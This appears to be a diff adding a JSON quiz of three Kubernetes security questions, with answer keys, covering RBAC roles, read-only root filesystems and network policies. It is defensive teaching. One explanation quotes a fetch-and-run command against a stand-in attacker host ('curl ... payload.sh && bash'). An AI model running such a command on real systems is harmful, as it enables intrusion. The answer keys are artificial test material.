@@ -1,0 +1,37 @@
+{
+    "questions": [
+        {
+            "question": "What is the difference between a Kubernetes 'Role' and a 'ClusterRole', and when would you use each?",
+            "options": [
+                "A Role has higher privileges than a ClusterRole because it is more specific.",
+                "A Role grants permissions scoped to a single namespace (e.g., only pods in the 'production' namespace). A ClusterRole grants permissions across all namespaces or for cluster-level resources (like Nodes and PersistentVolumes that don't belong to any namespace).",
+                "A Role is for human users; a ClusterRole is for ServiceAccounts.",
+                "A Role applies at runtime; a ClusterRole is evaluated at admission time."
+            ],
+            "answer": "A Role grants permissions scoped to a single namespace (e.g., only pods in the 'production' namespace). A ClusterRole grants permissions across all namespaces or for cluster-level resources (like Nodes and PersistentVolumes that don't belong to any namespace).",
+            "explanation": "Give a monitoring tool a Role to read pods in its own namespace. Give a cluster-admin tool a ClusterRole. Always prefer the narrower Role when possible — least-privilege principle."
+        },
+        {
+            "question": "What specific security attack does setting 'readOnlyRootFilesystem: true' in a Pod Security Context prevent?",
+            "options": [
+                "It prevents the pod from reading files from other pods' volumes.",
+                "It prevents malware or an attacker who exploits a vulnerability from writing files to the container's filesystem — stopping them from installing backdoors, modifying binaries, creating cron jobs, or dropping exploit scripts onto the container's writable layer.",
+                "It makes the container's image layers read-only in the container registry.",
+                "It prevents the container from reading Kubernetes Secrets mounted as volumes."
+            ],
+            "answer": "It prevents malware or an attacker who exploits a vulnerability from writing files to the container's filesystem — stopping them from installing backdoors, modifying binaries, creating cron jobs, or dropping exploit scripts onto the container's writable layer.",
+            "explanation": "A common post-exploitation step is 'curl https://attacker.com/payload.sh > /tmp/payload.sh && bash /tmp/payload.sh'. With readOnlyRootFilesystem=true, this write to /tmp fails immediately."
+        },
+        {
+            "question": "Without a Kubernetes Network Policy, what network access does a newly compromised pod have by default?",
+            "options": [
+                "A compromised pod can only reach pods in its own namespace.",
+                "By default, Kubernetes has no network isolation — a compromised pod can initiate TCP connections to any other pod in any namespace cluster-wide, including reaching the production database, the payment processing service, and pods in other teams' namespaces.",
+                "By default, pods can only reach external internet resources, not other pods.",
+                "By default, pods can only receive inbound traffic, not initiate outbound connections."
+            ],
+            "answer": "By default, Kubernetes has no network isolation — a compromised pod can initiate TCP connections to any other pod in any namespace cluster-wide, including reaching the production database, the payment processing service, and pods in other teams' namespaces.",
+            "explanation": "This is why Network Policies are critical in multi-tenant clusters. A compromised frontend pod should NEVER be able to directly connect to the database. Network Policies enforce this boundary."
+        }
+    ]
+}
